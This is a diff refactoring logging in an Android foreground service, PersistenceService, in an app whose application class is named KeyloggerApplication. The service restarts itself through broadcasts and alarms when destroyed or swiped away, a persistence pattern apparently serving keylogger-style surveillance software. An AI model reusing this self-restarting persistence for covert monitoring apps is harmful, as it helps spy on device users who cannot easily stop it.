@@ -12,7 +12,6 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
 import com.android.myapp.KeyloggerApplication
@@ -20,8 +19,8 @@ import com.android.myapp.R
 import com.android.myapp.core.BatteryConfig
 import com.android.myapp.receiver.BootCompletedReceiver
 import com.android.myapp.receiver.ServiceRestartReceiver
-import com.android.myapp.ui.DashboardActivity
 import timber.log.Timber
+import androidx.core.content.edit
 
 /**
  * Foreground service to maintain app persistence
@@ -69,8 +68,8 @@ class PersistenceService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "═══════════════════════════════════════")
-        Log.d(TAG, "PersistenceService onCreate")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
+        Timber.tag(TAG).d("PersistenceService onCreate")
 
 
         instance = this
@@ -79,21 +78,21 @@ class PersistenceService : Service() {
 
         setRunning(true)
 
-        Log.d(TAG, "Service instance created")
-        Log.d(TAG, "Power Profile: ${BatteryConfig.currentProfile}")
-        Log.d(TAG, "═══════════════════════════════════════")
+        Timber.tag(TAG).d("Service instance created")
+        Timber.tag(TAG).d("Power Profile: ${BatteryConfig.currentProfile}")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
     }
 
     private fun setRunning(running: Boolean) {
         getSharedPreferences("svc_state", MODE_PRIVATE)
-            .edit()
-            .putBoolean("persistence_running", running)
-            .putLong("persistence_last_update", System.currentTimeMillis())
-            .apply()
+            .edit {
+                putBoolean("persistence_running", running)
+                    .putLong("persistence_last_update", System.currentTimeMillis())
+            }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "onStartCommand - action: ${intent?.action}, startId: $startId")
+        Timber.tag(TAG).d("onStartCommand - action: ${intent?.action}, startId: $startId")
 
         // Get wake source if provided
         lastWakeSource = intent?.getStringExtra("wake_trigger") ?: "direct_start"
@@ -118,7 +117,7 @@ class PersistenceService : Service() {
      * Uses BatteryConfig for persistence check interval.
      */
     private fun startPersistenceMonitoring() {
-        Log.d(TAG, "Starting persistence monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")
+        Timber.tag(TAG).d("Starting persistence monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")
 
         // Remove any existing runnable
         persistenceCheckRunnable?.let { handler.removeCallbacks(it) }
@@ -139,7 +138,7 @@ class PersistenceService : Service() {
      */
     private fun performPersistenceCheck() {
         val uptime = (System.currentTimeMillis() - serviceStartTime) / 1000
-        Log.d(TAG, "persistence check - uptime: ${uptime}s, lastWake: $lastWakeSource, bleDevices: $lastBleDevicesSeen, profile: ${BatteryConfig.currentProfile}")
+        Timber.tag(TAG).d("persistence check - uptime: ${uptime}s, lastWake: $lastWakeSource, bleDevices: $lastBleDevicesSeen, profile: ${BatteryConfig.currentProfile}")
 
         // Update notification with status
         updateNotification()
@@ -150,11 +149,12 @@ class PersistenceService : Service() {
      */
     fun onBleDevicesSeen(count: Int) {
         lastBleDevicesSeen = count
-        Log.d(TAG, "BLE devices seen: $count")
+        Timber.tag(TAG).d("BLE devices seen: $count")
     }
 
     /**
-     * Start foreground service with correct type for Android 14+
+     * Start foreground service with correct type connectedDevice for Android 14+
+     * the type connectedDevice is perfect for BLE/Bluetooth operations
      */
     private fun startForegroundWithType() {
         val notification = createNotification()
@@ -179,7 +179,7 @@ class PersistenceService : Service() {
             startForeground(NOTIFICATION_ID, notification)
         }
 
-        Log.d(TAG, "Foreground service started with connectedDevice type")
+        Timber.tag(TAG).d("Foreground service started with connectedDevice type")
     }
 
     private fun startForeground() {
@@ -288,15 +288,15 @@ class PersistenceService : Service() {
                     pendingIntent
                 )
             }
-            Timber.Forest.d("Restart alarm scheduled")
+            Timber.tag(TAG).d("Restart alarm scheduled")
         } catch (e: Exception) {
-            Timber.Forest.e(e, "Failed to schedule restart alarm")
+            Timber.tag(TAG).e(e, "Failed to schedule restart alarm")
         }
     }
 
     override fun onDestroy() {
-        Log.d(TAG, "═══════════════════════════════════════")
-        Log.d(TAG, "persistenceMonitorService onDestroy")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
+        Timber.tag(TAG).d("persistenceMonitorService onDestroy")
 
         setRunning(false)
 
@@ -305,15 +305,17 @@ class PersistenceService : Service() {
         handler.removeCallbacksAndMessages(null)
 
         // Trigger restart via broadcast
+        Timber.tag(TAG).d("Sending restart broadcast...")
         sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
 
-        Log.d(TAG, "Service destroyed - restart triggered")
-        Log.d(TAG, "═══════════════════════════════════════")
+        Timber.tag(TAG).d("Service destroyed - restart triggered")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
+
         super.onDestroy()
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        Log.d(TAG, "onTaskRemoved - app swiped from recents")
+        Timber.tag(TAG).d("onTaskRemoved - app swiped from recents")
 
         // Trigger restart
         sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
